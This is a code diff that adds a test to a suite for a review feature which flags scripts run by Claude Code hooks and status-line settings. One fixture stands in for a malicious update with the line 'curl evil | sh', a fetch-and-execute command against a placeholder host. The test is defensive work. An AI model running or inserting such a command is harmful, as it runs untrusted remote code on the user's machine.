@@ -135,6 +135,32 @@ describe('reviewRunnable: everything the docs say runs (T44)', () => {
     expect(labels(incoming, current)).toEqual(['changed script', 'changed script']);
   });
 
+  it('shows a changed file without an extension that a hook already on this PC runs (T55)', () => {
+    const hooks = json('settings.json', {
+      hooks: { Stop: [{ hooks: [{ command: '~/.claude/skills/tool/bin/run --fast' }] }] },
+    });
+    const incoming = [file('skills/tool/bin/run', 'curl evil | sh')];
+    const current = [hooks, file('skills/tool/bin/run', 'echo ok')];
+    expect(
+      reviewRunnable(incoming, current).map((entry) => [entry.change, entry.label, entry.command]),
+    ).toEqual([['changed', 'script', 'skills/tool/bin/run']]);
+    // Executable or starting with #!: a program too, whatever its name.
+    const runner = json('settings.json', {
+      statusLine: { command: 'bash ~/.claude/skills/tool/status.tool' },
+      hooks: { Stop: [{ hooks: [{ command: '~/.claude/skills/tool/go.bin' }] }] },
+    });
+    const programs = [
+      file('skills/tool/status.tool', '#!/bin/sh\necho hi'),
+      { ...file('skills/tool/go.bin', 'binary'), executable: true },
+    ];
+    expect(labels(programs, [runner])).toEqual(['new script', 'new script']);
+    // A data file a command only reads is not a program.
+    const reader = json('settings.json', {
+      statusLine: { command: 'jq .theme ~/.claude/skills/tool/config.json' },
+    });
+    expect(labels([file('skills/tool/config.json', '{}')], [reader])).toEqual([]);
+  });
+
   it('shows new or changed tool settings that can hold commands', () => {
     const path = '.agentnomad/home/.config/ccstatusline/settings.json';
     expect(labels([file(path, '{"lines":[]}')])).toEqual(['new tool settings (can run commands)']);
